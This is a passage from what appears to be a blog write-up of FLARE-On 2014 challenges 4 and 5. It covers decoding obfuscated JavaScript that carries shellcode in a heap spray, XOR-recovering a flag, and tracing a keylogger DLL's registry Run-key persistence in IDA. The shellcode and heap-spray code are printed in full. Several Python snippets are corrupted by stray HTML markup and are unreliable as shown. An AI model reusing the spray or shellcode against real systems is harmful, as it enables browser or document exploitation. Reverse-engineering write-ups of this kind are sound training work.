u7168%ufa44%u81ff%u2f72%ua9f7%u0ca9%u8468%ucfe9%u8160%u3b72%u93be%u43a9%ud268%u9 8a3%u8137%u4772%u8a82%u3b62%uef68%u11a4%u814b%u5372%u47d6%uccc0%ube68%ua469%u81f f%u5f72%ucaa3%u3154%ud468%u65ab%u8b52%u57cc%u5153%u8b57%u89f1%u83f7%u1ec7%ufe39% u0b7d%u3681%u4542%u4645%uc683%ueb04%ufff1%u68d0%u7365%u0173%udf8b%u5c88%u0324%u5 068%u6f72%u6863%u7845%u7469%uff54%u2474%uff40%u2454%u5740%ud0ff&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// not important</span>
</span><span class='line'><span class="kd">var</span> <span class="nx">MPBPtdcBjTlpvyTYkSwgkrWhXL</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
</span><span class='line'><span class="k">for</span> <span class="p">(</span><span class="nx">EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA</span><span class="o">=</span><span class="mi">128</span><span class="p">;</span><span class="nx">EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="o">--</span><span class="nx">EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA</span><span class="p">)</span> <span class="nx">MPBPtdcBjTlpvyTYkSwgkrWhXL</span><span class="o">+=</span> <span class="nx">unescape</span><span class="p">(</span><span class="s2">&quot;%ub32f%u3791&quot;</span><span class="p">);</span>
</span><span class='line'><span class="nx">ETXTtdYdVfCzWGSukgeMeucEqeXxPvOfTRBiv</span> <span class="o">=</span> <span class="nx">MPBPtdcBjTlpvyTYkSwgkrWhXL</span> <span class="o">+</span> <span class="nx">IxTUQnOvHg</span><span class="p">;</span>
</span><span class='line'><span class="nx">OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHTY</span> <span class="o">=</span> <span class="nx">unescape</span><span class="p">(</span><span class="s2">&quot;%ub32f%u3791&quot;</span><span class="p">);</span>
</span><span class='line'><span class="nx">fJWhwERSDZtaZXlhcREfhZjCCVqFAPS</span> <span class="o">=</span> <span class="mi">20</span><span class="p">;</span>
</span><span class='line'><span class="nx">fyVSaXfMFSHNnkWOnWtUtAgDLISbrBOKEdKhLhAvwtdijnaHA</span> <span class="o">=</span> <span class="nx">fJWhwERSDZtaZXlhcREfhZjCCVqFAPS</span><span class="o">+</span><span class="nx">ETXTtdYdVfCzWGSukgeMeucEqeXxPvOfTRBiv</span><span class="p">.</span><span class="nx">length</span>
</span><span class='line'><span class="k">while</span> <span class="p">(</span><span class="nx">OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHTY</span><span class="p">.</span><span class="nx">length</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">fyVSaXfMFSHNnkWOnWtUtAgDLISbrBOKEdKhLhAvwtdijnaHA</span><span class="p">)</span> <span class="nx">OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHT</span><span class="o">+=</span><span class="nx">OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHTY</span><span class="p">;</span>
</span><span class='line'><span class="nx">UohsTktonqUXUXspNrfyqyqDQlcDfbmbywFjyLJiesb</span> <span class="o">=</span> <span class="nx">OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHTY</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">fyVSaXfMFSHNnkWOnWtUtAgDLISbrBOKEdKhLhAvwtdijnaHA</span><span class="p">);</span>
</span><span class='line'><span class="nx">MOysyGgYplwyZzNdETHwkru</span> <span class="o">=</span> <span class="nx">OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHTY</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHTY</span><span class="p">.</span><span class="nx">length</span><span class="o">-</span><span class="nx">fyVSaXfMFSHNnkWOnWtUtAgDLISbrBOKEdKhLhAvwtdijnaHA</span><span class="p">);</span>
</span><span class='line'><span class="k">while</span><span class="p">(</span><span class="nx">MOysyGgYplwyZzNdETHwkru</span><span class="p">.</span><span class="nx">length</span><span class="o">+</span><span class="nx">fyVSaXfMFSHNnkWOnWtUtAgDLISbrBOKEdKhLhAvwtdijnaHA</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span> <span class="mh">0x40000</span><span class="p">)</span> <span class="nx">MOysyGgYplwyZzNdETHwkru</span> <span class="o">=</span> <span class="nx">MOysyGgYplwyZzNdETHwkru</span><span class="o">+</span><span class="nx">MOysyGgYplwyZzNdETHwkr</span><span class="o">+</span><span class="nx">UohsTktonqUXUXspNrfyqyqDQlcDfbmbywFjyLJiesb</span><span class="p">;</span>
</span><span class='line'><span class="nx">DPwxazRhwbQGu</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Array</span><span class="p">();</span>
</span><span class='line'><span class="k">for</span> <span class="p">(</span><span class="nx">EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nx">EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="mi">100</span><span class="p">;</span><span class="nx">EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA</span><span class="o">++</span><span class="p">)</span> <span class="nx">DPwxazRhwbQGu</span><span class="p">[</span><span class="nx">EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA</span><span class="p">]</span> <span class="o">=</span> <span class="nx">MOysyGgYplwyZzNdETHwkru</span> <span class="o">+</span> <span class="nx">ETXTtdYdVfCzWGSukgeMeucEqeXxPvOfTRBiv</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="k">for</span> <span class="p">(</span><span class="nx">EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA</span><span class="o">=</span><span class="mi">142</span><span class="p">;</span><span class="nx">EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="o">--</span><span class="nx">EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA</span><span class="p">)</span> <span class="nx">zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf</span> <span class="o">+=</span> <span class="nx">unescape</span><span class="p">(</span><span class="s2">&quot;%ub550%u0166&quot;</span><span class="p">);</span>
</span><span class='line'><span class="nx">bGtvKT</span> <span class="o">=</span> <span class="nx">zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf</span><span class="p">.</span><span class="nx">length</span> <span class="o">+</span> <span class="mi">20</span><span class="p">;</span>
</span><span class='line'>    <span class="k">while</span> <span class="p">(</span><span class="nx">zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf</span><span class="p">.</span><span class="nx">length</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span> <span class="nx">bGtvKT</span><span class="p">)</span> <span class="nx">zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf</span> <span class="o">+=</span> <span class="nx">zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf</span><span class="p">;</span>
</span><span class='line'><span class="nx">Juphd</span> <span class="o">=</span> <span class="nx">zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">bGtvKT</span><span class="p">);</span>
</span><span class='line'><span class="nx">QCZabMzxQiD</span> <span class="o">=</span> <span class="nx">zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf</span><span class="p">.</span><span class="nx">length</span><span class="o">-</span><span class="nx">bGtvKT</span><span class="p">);</span>
</span><span class='line'><span class="k">while</span><span class="p">(</span><span class="nx">QCZabMzxQiD</span><span class="p">.</span><span class="nx">length</span><span class="o">+</span><span class="nx">bGtvKT</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span> <span class="mh">0x40000</span><span class="p">)</span> <span class="nx">QCZabMzxQiD</span> <span class="o">=</span> <span class="nx">QCZabMzxQiD</span><span class="o">+</span><span class="nx">QCZabMzxQiD</span><span class="o">+</span><span class="nx">Juphd</span><span class="p">;</span>
</span><span class='line'><span class="nx">FovEDIUWBLVcXkOWFAFtYRnPySjMblpAiQIpweE</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Array</span><span class="p">();</span>
</span><span class='line'><span class="k">for</span> <span class="p">(</span><span class="nx">EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nx">EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="mi">125</span><span class="p">;</span><span class="nx">EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA</span><span class="o">++</span><span class="p">)</span> <span class="nx">FovEDIUWBLVcXkOWFAFtYRnPySjMblpAiQIpweE</span><span class="p">[</span><span class="nx">EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA</span><span class="p">]</span><span class="o">=</span> <span class="nx">QCZabMzxQiD</span> <span class="o">+</span> <span class="nx">zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>
</code></pre>

<p>Obfuscated JavaScript. I executed it and printed the last variable, but the result was garbage. The code just does a lot of computatation. However variable <code>IxTUQnOvHg</code> looks suspicious. A large number of bytes are unescaped. After reading some guides, I found out how to decode this. <code>%u72f9</code> should be converted to <code>0xf972</code>. I wrote a simple Python program to do this decoding. Read 6 characters, discard the first two (%u), swap characters 3 and 4 with 5 and 6. The end result is some shellcode. I used this website to convert it to an executable: <a href="http://sandsprite.com/shellcode_2_exe.php">http://sandsprite.com/shellcode_2_exe.php</a>.</p>

<p>After running the executable in Immunity a message box pops up with an encoded message. If we look inside memory, we can find this string.</p>

<p><img src="/images/2014/flare/4-1.jpg" alt="MessageBox Text" title="MessageBox Text" /></p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>First string in hex </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>2574243575216B2A36366B2F3274752E2A2305316B203723256B2B2D46</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>The length is close to the email (29 bytes). Here’s what I thought. If it is the email then the last 13 bytes should be <code>@flare-on.com</code>. It’s probably xor-ed with a key. If the key is smaller than 13 bytes then it is repeated and we can easily find it. How? xor is transitive. If <code>plaintext xor key = ciphertext</code> then <code>key = plaintext xor ciphertext</code>. If we xor the last 13 bytes of ciphertext with <code>@flare-on.com</code> then we will find the last 13 bytes of the key. If key is smaller than plain/ciphertext (if key is as long as plain/ciphertext then we will have a <code>one time pad</code>) it is repeated.</p>

<p>The following Python code does it. On a side note, we really need a string xor operator in Python. I wrote one which is probably not that good.</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>First string xor </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">def</span> <span class="nf">xor</span><span class="p">(</span><span class="n">mydata</span><span class="p">,</span><span class="n">mykey</span><span class="p">):</span>
</span><span class='line'>    <span class="n">keylen</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">mykey</span><span class="p">)</span>
</span><span class='line'>    <span class="n">datalen</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">mydata</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;&lt;</span><span class="n">code</span><span class="o">&gt;</span><span class="c"># easier to just extend the key array, but probably not that efficient</span>
</span><span class='line'><span class="c"># not that we care about it here ;)</span>
</span><span class='line'><span class="n">key</span> <span class="o">=</span> <span class="n">mykey</span> <span class="o">*</span> <span class="p">(</span> <span class="p">(</span><span class="n">datalen</span><span class="o">/</span><span class="n">keylen</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span> <span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">return</span> <span class="s">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">a</span><span class="p">)</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">b</span><span class="p">))</span> <span class="k">for</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">mydata</span><span class="p">,</span><span class="n">key</span><span class="p">))</span>
</span><span class='line'><span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kn">from</span> <span class="nn">binascii</span> <span class="kn">import</span> <span class="n">hexlify</span><span class="p">,</span> <span class="n">unhexlify</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span> <span class="nb">id</span><span class="o">=</span><span class="s">&quot;last-13-bytes&quot;</span><span class="o">&gt;</span><span class="n">last</span> <span class="mi">13</span> <span class="nb">bytes</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">ciphertext</span> <span class="o">=</span> <span class="n">unhexlify</span><span class="p">(</span><span class="err">“</span><span class="mi">2574243575216</span><span class="n">B2A36366B2F3274752E2A2305316B203723256B2B2D46</span><span class="err">”</span><span class="p">)[</span><span class="o">-</span><span class="mi">13</span><span class="p">:]</span>
</span><span class='line'><span class="n">plaintext</span> <span class="o">=</span> <span class="err">“</span><span class="nd">@flare</span><span class="o">-</span><span class="n">on</span><span class="o">.</span><span class="n">com</span><span class="err">”</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">print</span> <span class="n">xor</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">,</span><span class="n">plaintext</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">hexlify</span><span class="p">(</span> <span class="n">xor</span> <span class="p">(</span><span class="n">ciphertext</span><span class="p">,</span><span class="n">plaintext</span><span class="p">)</span> <span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span> <span class="nb">id</span><span class="o">=</span><span class="s">&quot;result---&quot;</span><span class="o">&gt;</span><span class="n">result</span> <span class="o">-</span> <span class="p">:(</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="c"># jEiPELKEHB+</span>
</span><span class='line'><span class="c"># 6a45695019451a4c4b4548422b&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>Nope. Doesn’t look like it.</p>

<p>I usually wander around in the debugger and look at memory. Run the executable in Immunity and look around in memory after the message box pops up. A little bit further up from the original message we see more <code>OWNED!!!</code> strings (title of the message box). Right before two owneds I saw another string. This one is longer and looks more promising. Right click on it and select <code>Follow in Dump</code>. Select the string  and again right click and select <code>Copy &gt; To clipboard</code>. It’s in Unicode so <code>5</code> represented as <code>0x0035</code> instead of <code>0x35</code>.</p>

<p><img src="/images/2014/flare/4-2.jpg" alt="Interesting String" title="Interesting String" /></p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>Second string in hex </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># I did not select the first 00 before 5 (0x0035)
</span><span class='line'>00143868  35 00 24 00 74 00 25 00  5.$.t.%.
</span><span class='line'>00143870  2A 00 6B 00 21 00 75 00  &lt;em>.k.!.u.
</span><span class='line'>00143878  2F 00 6B 00 36 00 36 00  /.k.6.6.
</span><span class='line'>00143880  2E 00 75 00 74 00 32 00  ..u.t.2.
</span><span class='line'>00143888  31 00 05 00 23 00 2A 00  1..#.&lt;/em>.
</span><span class='line'>00143890  23 00 37 00 20 00 6B 00  #.7. .k.
</span><span class='line'>00143898  2D 00 2B 00 6B 00 25 00  -.+.k.%.
</span><span class='line'>001438A0  2D 00 28                 -.(&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1 id="or-in-python-friendly-format">or in Python-friendly format&lt;/h1>
</span><span class='line'>&lt;p>352474252a6b21752f6b36362e7574323105232a2337206b2d2b6b252d28</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>Let’s apply the xor-logic on this string too.</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>Second string xor </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c"># add xor function from last example</span>
</span><span class='line'><span class="kn">from</span> <span class="nn">binascii</span> <span class="kn">import</span> <span class="n">hexlify</span><span class="p">,</span> <span class="n">unhexlify</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span> <span class="nb">id</span><span class="o">=</span><span class="s">&quot;last-13-bytes-1&quot;</span><span class="o">&gt;</span><span class="n">last</span> <span class="mi">13</span> <span class="nb">bytes</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">ciphertext</span> <span class="o">=</span> <span class="n">unhexlify</span><span class="p">(</span><span class="err">“</span><span class="mi">352474252</span><span class="n">a6b21752f6b36362e7574323105232a2337206b2d2b6b252d28</span><span class="err">”</span><span class="p">)[</span><span class="o">-</span><span class="mi">13</span><span class="p">:]</span>
</span><span class='line'><span class="n">plaintext</span> <span class="o">=</span> <span class="err">“</span><span class="nd">@flare</span><span class="o">-</span><span class="n">on</span><span class="o">.</span><span class="n">com</span><span class="err">”</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">print</span> <span class="n">xor</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">,</span><span class="n">plaintext</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">hexlify</span><span class="p">(</span> <span class="n">xor</span> <span class="p">(</span><span class="n">ciphertext</span><span class="p">,</span><span class="n">plaintext</span><span class="p">)</span> <span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span> <span class="nb">id</span><span class="o">=</span><span class="s">&quot;result-&quot;</span><span class="o">&gt;</span><span class="n">result</span> <span class="p">:)</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="c"># EEFBEEFBEEFBE</span>
</span><span class='line'><span class="c"># 45454642454546424545464245</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>Bingo. The key is <code>BEEF</code>. It is also in the initial shellcode as a string. Let’s xor it with the complete string and get the flag.</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>Flag 4 </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>wa1ch.d3m.spl01ts@flare-on.com</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<hr />

<h2 id="a-namech5a-challenge-5---5get-about-it"><a name="ch5"></a> Challenge 5 - 5get About It</h2>

<p><code>
Another one bites the dust!
Here's some more fun for you, password is the same as always.
-FLARE
</code></p>

<h3 id="be-sure-to-run-this-challenge-in-a-vm">Be sure to run this challenge in a VM.</h3>

<p>The file inside the challenge zip is named <code>5get_it</code> and is around 100KBs. A quick look with <code>HxD</code> says it’s a Portable Executable (MZ and PE magic bytes). Let’s get some help from <code>PE-Studio</code>. It has a VirusTotal score of 29/55 with most AVs calling it a generic trojan or keylogger. Click on <code>Imported Symbols</code> and look at the red symbols. Some of them are more interesting than others. To get more information about any of them, right click and select <code>Query MSDN</code> inside PE-Studio (handy, neh?).</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>Interesting symbols </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>RegSetValueExA - RegCreateKeyA: Messing with registry
</span><span class='line'>CreateFileW - CreateFileA - WriteFile - CopyFileA: Creating, writing to, and copying file
</span><span class='line'>GetAsyncKeyState: “Determines whether a key is up or down at the time the function is called, and whether the key was pressed after a previous call to GetAsyncKeyState”</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>Also, let’s run <code>strings</code> on it. I used <a href="https://www.cygwin.com/">cygwin</a>. I have omitted the garbage and only kept the interesting strings:</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>Interesting strings </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ strings.exe 5get_it
</span><span class='line'>svchost.log
</span><span class='line'>[SHIFT]
</span><span class='line'>[RETURN]
</span><span class='line'>[BACKSPACE]
</span><span class='line'>[TAB]
</span><span class='line'>[CTRL]
</span><span class='line'>[DELETE]
</span><span class='line'>[CAPS LOCK]
</span><span class='line'>SOFTWARE\Microsoft\Windows\CurrentVersion\Run
</span><span class='line'>svchost
</span><span class='line'>c:\windows\system32\svchost.dll
</span><span class='line'>c:\windows\system32\rundll32.exe c:\windows\system32\svchost.dll</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>While doing the challenge only the first and last two lines were interesting to me.</p>

<ul>
  <li>It references <code>c:\windows\system32\svchost.dll</code> and <code>svchost.log</code> but there is no such file (Windows has <code>svchost.exe</code> in that location).</li>
  <li>There is also <code>c:\windows\system32\rundll32.exe c:\windows\system32\svchost.dll</code> which means this file is most probably a DLL and should be executed like that. There are no parameters, so whatever this DLL is doing should be in <code>DllMain</code>.</li>
</ul>

<p><strong>By this time you probably know what this file is supposed to do (also look at the registry key). However, at that time I did not make the connection :(</strong></p>

<p>Let’s drop this into <code>IDA</code> and jump into DllMain. I used IDA Pro but both IDA free and trial and Immunity Debugger work for this challenge (and also <a href="#ch7">challenge 7</a>). Put a breakpoint at the start of this function (<code>F2</code> key).</p>

<p><img src="/images/2014/flare/5-1.jpg" alt="DLL Entry Point" title="DLL Entry Point" /></p>

<p>If we attempt to execute the tile. IDA will complain. It’s a DLL and cannot be run by itself. But we already know how to run it thanks to the strings inside the binary. In IDA first select <code>Local Win32 Debugger</code> then go to <code>Debugger</code> menu and select <code>Process Options</code>. In the <code>Application</code> textbox enter <code>c:\windows\system32\rundll32.exe</code>. In <code>Parameters</code> enter the path to the DLL. Don’t forget to rename the file, add dll extension and include double-quotes around the path if it contains spaces (e.g. <code>"c:\Flare Challenges\Ch5\5get_it.dll",0</code>). It didn’t work without the dll extension for me.</p>

<p>Let’s start debugging. We observe standard stuff until we reach <code>.text:1000A6BB call    sub_1000A570</code>.</p>

<p><img src="/images/2014/flare/5-2.jpg" alt="sub 1000A570" title="sub 1000A570" /></p>

<p>Inside the function we encounter <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms724897%28v=vs.85%29.aspx">RegOpenKeyEx</a> that opens a registry key. Full registry key is a combination of <code>hKey</code> and <code>lpSubKey</code>. <code>hKey</code> can be one of the <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms724836%28v=vs.85%29.aspx">predefined keys</a>. The constants for the predefined keys needed a bit of googling because the MSDN page didn’t list them. Here they are:</p>

<table>
  <thead>
    <tr>
      <th>Key</th>
      <th style="text-align: center">Constant</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>HKEY_CLASSES_ROOT</td>
      <td style="text-align: center">0</td>
    </tr>
    <tr>
      <td>HKEY_CURRENT_USER</td>
      <td style="text-align: center">1</td>
    </tr>
    <tr>
      <td>HKEY_LOCAL_MACHINE</td>
      <td style="text-align: center">2</td>
    </tr>
    <tr>
      <td>HKEY_USERS</td>
      <td style="text-align: center">3</td>
    </tr>
    <tr>
      <td>HKEY_CURRENT_CONFIG</td>
      <td style="text-align: center">5</td>
    </tr>
  </tbody>
</table>

<p>The binary is pushing <code>0x02</code> for <code>hKey</code> and <code>SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run</code> for <code>lpSubKey</code> which will result in the full path <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</code>. If function succeeds it will return <code>ERROR_SUCCESS</code> which is 0 according to <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms681382%28v=vs.85%29.aspx">this page</a>, otherwise it will return another error code.</p>

<p><img src="/images/2014/flare/5-3.jpg" alt="Registry Key" title="Registry Key" /></p>

<p>The binary will check if it has access to registry at that path. If so then the return value (in eax) will be 0 and it will jump right (JZ will succeed).<br />
<a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms724911%28v=vs.85%29.aspx">RegQueryValueEx</a> checks if there is a registry key at an open path. It is looking for a registry key named <code>svchost</code> at that path. If such key exists, function will return 0. In this case, it returned 2 which stands for <code>ERROR_FILE_NOT_FOUND</code> meaning there was no such key. Then it will call <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms724837%28v=vs.85%29.aspx">RegCloseKey</a> and closes the open registry path. This function’s return value is saved in <code>var_110</code> (we will need it later):</p>

<table>
  <thead>
    <tr>
      <th>Condition</th>
      <th style="text-align: center">Return Value</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Registry key cannot be opened</td>
      <td style="text-align: center">1</td>
    </tr>
    <tr>
      <td>Registry key does not exist</td>
      <td style="text-align: center">2</td>
    </tr>
    <tr>
      <td>Registry key exists</td>
      <td style="text-align: center">1000A6BB or DllMain(x,x,x)+3B</td>
    </tr>
  </tbody>
</table>

<p>After that function, we see that it is calling <code>GetModuleHandleEx</code> for <code>sub_1000A610</code> in lines 3-8 and checks the return value in line 9. The return value for <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms683200%28v=vs.85%29.aspx">GetModuleHandleEx</a> will be non-zero, otherwise it will be zero. If call was not successful then last error will be printed to file.</p>

